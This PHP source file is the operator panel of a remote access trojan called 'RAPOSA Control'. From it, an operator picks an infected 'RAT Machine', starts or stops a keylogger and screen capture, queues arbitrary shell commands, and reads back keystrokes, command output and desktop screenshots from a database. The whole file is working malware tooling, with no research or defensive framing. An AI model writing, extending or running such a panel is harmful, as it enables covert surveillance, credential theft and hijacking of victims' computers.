<?php  
    if (isset($_GET['machine']) && !empty($_GET['machine'])) {
        $machine = $_GET['machine'];
    } elseif (isset($_POST['machine']) && !empty($_POST['machine'])) {
        $machine = $_POST['machine'];
    } else {
        $machine = 'no machine';
    }
?>

<section class="section">
    <div class="container">
        <!-- Card Header -->
        <div class="card has-background-primary">
            <div class="columns is-vcentered is-centered">
                <div class="column is-narrow">
                    <figure class="image" style="width: 10rem;">
                        <img src="<?= "$web_root/assets/images/possum.png"; ?>" alt="Raposa">
                    </figure>
                </div>
                <div class="column">
                    <h1 class="title">RAPOSA Control</h1>
                </div>
            </div>
        </div>

        <div class="box">
            <h2 class="subtitle">Quick Commands</h2>
            <form method="post" action="index.php">
                <input type="hidden" name="machine" value="<?= htmlspecialchars($machine) ?>">
                <div class="field is-grouped is-grouped-multiline">
                    <div class="control">
                        <button class="button is-info is-outlined" type="submit" name="command" value="startkeylog">Start Keylogger</button>
                    </div>
                    <div class="control">
                        <button class="button is-warning is-outlined" type="submit" name="command" value="stopkeylog">Stop Keylogger</button>
                    </div>
                    <div class="control">
                        <button class="button is-success is-outlined" type="submit" name="button_keylog">Get Keylog</button>
                    </div>
                    <div class="control">
                        <button class="button is-info is-outlined" type="submit" name="command" value="startdc">Start ScreenCap</button>
                    </div>
                    <div class="control">
                        <button class="button is-warning is-outlined" type="submit" name="command" value="stopdc">Stop ScreenCap</button>
                    </div>
                    <div class="control">
                        <button class="button is-success is-outlined" type="submit" name="button_screen">Get ScreenCap</button>
                    </div>
                </div>
            </form>
        </div>

        <div class="box">
            <form method="post" action="index.php" id="cmd_form">                
                <h2 class="subtitle">Command Control Panel</h2>
                <div class="columns is-variable is-8">
                    <div class="column is-half">
                        <div class="field">
                            <label class="label has-text-info">RAT Machine:</label>
                            <div class="control has-icons-left">
                                <input class="input is-info" type="text" name="machine" readonly value="<?= htmlspecialchars($machine) ?>">
                                <span class="icon is-small is-left">
                                    <i class="fas fa-desktop"></i>
                                </span>
                            </div>
                        </div>
                        <div class="field">
                            <label class="label has-text-info">Run Command</label>
                            <div class="control has-icons-left">
                                <input class="input is-info" type="text" name="command" placeholder="start chrome www.google.com" value="<?= htmlspecialchars(get_machine_data($machine, 'command') ?? '') ?>">
                                <span class="icon is-small is-left">
                                    <i class="fas fa-terminal"></i>
                                </span>
                            </div>
                        </div>
                    </div>
                    <div class="column">
                        <div class="field">
                            <label class="label has-text-info">Command Buffer</label>
                            <div class="control">
                                <textarea class="textarea is-info" name="command_buffer" placeholder="Add a list of commands divided by &&" rows="6"><?= htmlspecialchars(get_machine_data($machine, 'command_buffer') ?? '') ?></textarea>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="field is-grouped is-grouped-centered mt-4">
                    <div class="control">
                        <button class="button is-primary is-outlined" type="submit" name="button_execute">
                            <span class="icon"><i class="fas fa-play"></i></span>
                            <span>Execute</span>
                        </button>
                    </div>
                    <div class="control">
                        <button class="button is-success is-outlined" type="submit" name="button_result">
                            <span class="icon"><i class="fas fa-download"></i></span>
                            <span>Get Output</span>
                        </button>
                    </div>
                    <div class="control">
                        <a class="button is-link is-outlined" href="/">
                            <span class="icon"><i class="fas fa-home"></i></span>
                            <span>Home</span>
                        </a>
                    </div>
                </div>
            </form> 
        </div>

        <?php
        function get_machine_data($machine, $column) {
            $conn = connect_to_db();
            $query = "SELECT $column FROM machines WHERE name = ? ORDER BY id DESC LIMIT 1";
            $stmt = $conn->prepare($query);
            $stmt->bind_param('s', $machine);
            $stmt->execute();
            $stmt->bind_result($output);
            $stmt->fetch();
            $stmt->close();
            $conn->close();
            return $output;
        }

        if (isset($_POST['button_execute'])) {
            $command = $_POST['command'] ?? '';
            $command_buffer = $_POST['command_buffer'] ?? '';

            if (!empty($command) || !empty($command_buffer)) {
                $conn = connect_to_db();
                $query = "UPDATE machines SET command = ?, command_buffer = ? WHERE name = ?";
                $stmt = $conn->prepare($query);
                $stmt->bind_param('sss', $command, $command_buffer, $machine);
                $stmt->execute();
                $stmt->close();
                $conn->close();

                echo "Commands saved successfully for " . htmlspecialchars($machine);
            } else {
                echo "Commands cannot be empty";
            }
        }
        if (isset($_POST['button_result'])) {
            $output = get_machine_data($machine, 'output');
            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Output
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">
                        <textarea class="textarea is-info" rows="20" readonly>' . htmlspecialchars($output) . '</textarea>
                    </div>
                </div>
            </div>';
        }

        if (isset($_POST['button_keylog'])) {
            $output = get_machine_data($machine, 'keylog');
            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Keylog
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">
                        <textarea class="textarea is-info" rows="20" readonly>' . htmlspecialchars($output) . '</textarea>
                    </div>
                </div>
            </div>';
        }

        if (isset($_POST['button_screen'])) {
            $output = get_machine_data($machine, 'desktop');
            $img = "<img width='600' src='data:image/jpeg;base64," . base64_encode($output) . "'/>";
            echo '
            <div class="card mt-5">
                <header class="card-header">
                    <p class="card-header-title">
                        Desktop
                    </p>
                </header>
                <div class="card-content">
                    <div class="content">
                        ' . $img . '
                    </div>
                </div>
            </div>';
        }
        ?>
    </div>
</section>
